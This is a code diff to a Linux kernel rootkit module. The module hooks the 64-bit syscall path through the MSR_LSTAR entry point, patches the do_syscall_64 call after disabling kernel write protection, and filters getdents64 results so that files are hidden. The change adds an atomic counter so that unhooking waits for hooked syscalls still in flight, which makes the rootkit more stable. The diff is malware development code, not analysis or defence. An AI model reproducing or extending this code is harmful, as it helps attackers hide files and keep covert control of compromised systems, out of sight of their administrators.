@@ -3,6 +3,7 @@
 #include <linux/slab.h>
 #include <linux/fdtable.h>
 #include <linux/dcache.h>
+#include <linux/delay.h>
 #include <linux/irqflags.h>
 #include <asm/nospec-branch.h>
 #include <asm/msr-index.h>
@@ -16,6 +17,8 @@
 #include "hook.h"
 
 #define SEARCHLEN  512
+
+atomic_t syscall64_count;
 
 extern rootkit_t rootkit;
 
@@ -42,7 +45,8 @@ static unsigned long oldOff;
 
 void
 hide_files_lstar(void)
-{      
+{     
+    atomic_set(&syscall64_count, 0);
     syscall_64_ptr = find_do_syscall_64((char *)read_msr(MSR_LSTAR));
 
     if(!do_syscall_64 || !syscall_64_ptr)
@@ -63,6 +67,8 @@ unhide_files_lstar(void)
     disable_protection();
     memcpy((syscall_64_ptr + 1), &oldOff, 4);
     enable_protection();
+    while (atomic_read(&syscall64_count) > 0)
+        msleep(250);
 }
 
 //Only use with multiples of 16..
@@ -132,7 +138,9 @@ find_do_syscall_64(char *lstar_addr)
 void
 g7_syscall_64(unsigned long nr, struct pt_regs *pt_regs)
 {
+    atomic_inc(&syscall64_count);
     do_syscall_64(nr, pt_regs);
+
 
     if (nr == __NR_getdents64) {
         //  
@@ -196,6 +204,7 @@ g7_syscall_64(unsigned long nr, struct pt_regs *pt_regs)
         kfree(kdirent);
     }
 
+    atomic_dec(&syscall64_count);
     local_irq_disable();
 }
 
